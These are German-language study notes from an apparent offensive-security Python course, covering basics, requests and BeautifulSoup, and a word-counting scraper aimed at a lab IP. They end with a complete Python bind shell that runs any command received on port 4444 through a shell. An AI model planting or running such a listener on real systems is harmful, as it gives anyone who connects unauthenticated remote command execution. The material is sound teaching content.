Introduction to Python3:
- Python ist eine implementierte Sprache welche meistens zum scripten verwendet wird

##############################################################################################
Python Fundamentals:
1. Executing Python Code:
- Python code kann direkt aus einer .py Datei oder in einer Python IDLE(Integrated Development and Learning Environment) ausgefuehrt werden

- Python3:
	- python3 <Python_Datei>

- IDLE:
	- python3 ausfuehren um in das IDLE zu kommen
	- In diesem Terminal kann Python3 Code ausgefuehrt werden

- Shebang:
	- In der ersten Zeile muss <#!/usr/bin/env python3> geschrieben werden 
	- Ausfuehrung:
		- chmod +x welcome.py
		- ./welcome.py

2. Introduction to Variables:
- Strings:
	- Strings werden durch Anfuehrungsstriche angezeigt
	- advice = "Dont panic"

- Integer:
	- Integer speichert eine Zahl oder eine Rechnung
	- advice = 42
	- advice = 6 * 7

- Booleans:
	- Booleans koennen wahr oder falsch sein
	- advice = True
	- advice = False

- Comments:
	- Kommentare werden vom Programm ignoriert
	- Kommentare werden vom Hashtag gekennzeichnet

3. Conditional Statements and Loops:
- A Simple Feature Switch:
	- if Bedingung:
		Befehl1
	  else:
	  	Befehl2	

- If-Elif-Else Statement:
	if Bedingung == Wert1:
	    Befehl1
	elif Bedingung == Wert2:
	    Befehl2
	else:
    	Befehl3

- The While-Loop:
	- while Bedingung < Wert1:
	    Befehl1
	    Bedingung = Bedingung + 1

- Loops and Lists:
	- A List of Strings:
		- Das erste Element hat den Index 0
		- Es kann auch der negative Index verwendet werden
		- -1 ist das letzte Element
		- groceries = ['Walnuts', 'Grapes', 'Bird seeds']

	- Substrings:
		- print(var[:Ende]) Erstellt String vom 0 bis zum Ende 
		- print(var[Anfang:Ende]) Erstellt String vom Anfang bis zum Index

- For-Each Loop:
	groceries = ['Walnuts', 'Grapes', 'Bird seeds']
	for food in groceries:
	    print(f'I bought some {food} today.')

##############################################################################################
Keeping It Simple and Smart:
1. Defining Functions:
- Functions:
	- Die Definition einer Funktion geschieht mit def Funktionsname(Input):
	- Die erste Zeile wird signature genannt
	def Funktionsname(x):
		return 2 * x + 5

	- Power_Of Function:
	- Berechnet die Potenzen
	def power_of(x, exponent):
    	return x ** exponent

    - Function Call:
    	- Die Funktion wird mit dem Funktionsnamen aufgerufen
    	def power_of(x, exponent):
    		return x ** exponent

    	- power_of(4, 2)
    	- Variable = power_of(2, 3)
    	- Wir koennen dem Input einen named parameters zuweisen
    		- power_of(x=4,exponent=2)
    	- positional parameters muessen wir keinen Namen nennen
    		- power_of(4,2)

2. Making Code Classy:
- Eine Klasse ist ein Spezifikation wie ein Objekt produziert wird
- Die Klasse wird mit class <Klassenname>: definiert
- Die __init__ Funktion definiert die Klassenvariablen
- Mit self werden die Parameter definiert des eigenen Objekts

- Objekt erstellen:
	- Variable1 = Klasse1()
	- Variable1 = Klasse1(Input1, Input2)
	- Variable1 = Klasse1(Inputvariable1=Input1, Inputvariable2=Input2)

##############################################################################################
The Importance of Libraries:
1. Introduction to Libraries:
- Eine librarie hat vorgeschriebenen Code den man in verschiedenen Projekten verwenden kann
- Wenn die Librarie importiert ist koennen wie die Funktionen und Klassen in der Librarie verwenden
- import <Librarie_Name>
- from <Librarie_Name> import <Class>
- from <Librarie_Name> import <Class> as <Name_given>

2. Managing Libraries in Python:
- Mit pip koennen Paket nachinstalliert werden
- python3 -m pip install <PaketName>
- python3 -m pip install --upgrade <PaketName>
- pip uninstall [<PaketName>]

3. The Importance of Libraries:
- The Request Package:
	- Die Request Librarie ein simples HTTP Paket
	- Mit <import requests> kann es importiert werden
	import requests
	resp = requests.get('http://httpbin.org/ip')
	print(resp.content.decode())

- The BeautifulSoup Package:
	- Mit BeautifulSoup koennen wir HTML ausgeben
	- python3 -m pip install beautifulsoup4
		from bs4 import BeautifulSoup

		html_doc = """ html code goes here """
		soup = BeautifulSoup(html_doc, 'html.parser')
		print(soup.prettify())

##############################################################################################
Word Extractor:
1. The First Iterations:
- Wir werden ein kleines Programm schreiben um die Webseite durchzusuchen
- Wir geben zuerst die Website aus
	import requests

	PAGE_URL = 'http://target:port'

	resp = requests.get(PAGE_URL)
	html_str = resp.content.decode()
	print(html_str)

- Dann erweitern wir den Code error Handling und HTML Analyse
	import requests
	import re
	from bs4 import BeautifulSoup

	PAGE_URL = 'http://target:port'

	def get_html_of(url):
	    resp = requests.get(url)

	    if resp.status_code != 200:
	        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
	        exit(1)

	    return resp.content.decode()

	html = get_html_of(PAGE_URL)
	soup = BeautifulSoup(html, 'html.parser')
	raw_text = soup.get_text()
	all_words = re.findall(r'\w+', raw_text)

- Counting Word Occurrences:
	- Wir zaehlen die Haeufigkeit der Worte
	all_words = re.findall(r'\w+', raw_text)

	word_count = {}

	for word in all_words:
	    if word not in word_count:
	        word_count[word] = 1
	    else:
	        current_count = word_count.get(word)
	        word_count[word] = current_count + 1
 	top_words = sorted(word_count.items(), key=lambda item: item[1], reverse=True)
 	
 	for i in range(10):
		print(top_words[i])

2. Continuously Improving The Code:
- Wir koennen Teile des Codes refactoren und zusammenfassen
import requests
import re
from bs4 import BeautifulSoup

PAGE_URL = 'http://94.237.56.76:40783'

def get_html_of(url):
    resp = requests.get(url)

    if resp.status_code != 200:
        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
        exit(1)

    return resp.content.decode()

html = get_html_of(PAGE_URL)
soup = BeautifulSoup(html, 'html.parser')
raw_text = soup.get_text()
all_words = re.findall(r'\w+', raw_text)

word_count = {}

for word in all_words:
    if word not in word_count:
        word_count[word] = 1
    else:
        current_count = word_count.get(word)
        word_count[word] = current_count + 1

top_words = sorted(word_count.items(), key=lambda item: item[1], reverse=True)

for i in range(10):
	if(len(top_words[i][0]) >8):
    	print(top_words[i][0])

Frage:                                              I      
import requests
import re
from bs4 import BeautifulSoup

PAGE_URL = 'http://94.237.56.76:40783'

def get_html_of(url):
    resp = requests.get(url)

    if resp.status_code != 200:
        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
        exit(1)

    return resp.content.decode()

def count_occurrences_in(word_list):
    word_count = {}

    for word in word_list:
        if word not in word_count:
            word_count[word] = 1
        else:
            current_count = word_count.get(word)
            word_count[word] = current_count + 1
    return word_count

def get_all_words_from(url):
    html = get_html_of(url)
    soup = BeautifulSoup(html, 'html.parser')
    raw_text = soup.get_text()
    return re.findall(r'\w+', raw_text)

def get_top_words_from(all_words):
    occurrences = count_occurrences_in(all_words)
    return sorted(occurrences.items(), key=lambda item: item[1], reverse=True)

all_words = get_all_words_from(PAGE_URL)
top_words = get_top_words_from(all_words)

for i in range(100):
    if len(top_words[i][0]) > 8:
        print(top_words[i][0])

##############################################################################################
Turnign It up to 11:
1. A Simple Bind Shell:
- Wir koennen ein eigenes Script fuer eine Bind Shell schreiben 
import socket
import subprocess
import click

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)
    client_socket, address = s.accept()

    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

if __name__ == '__main__':
    main()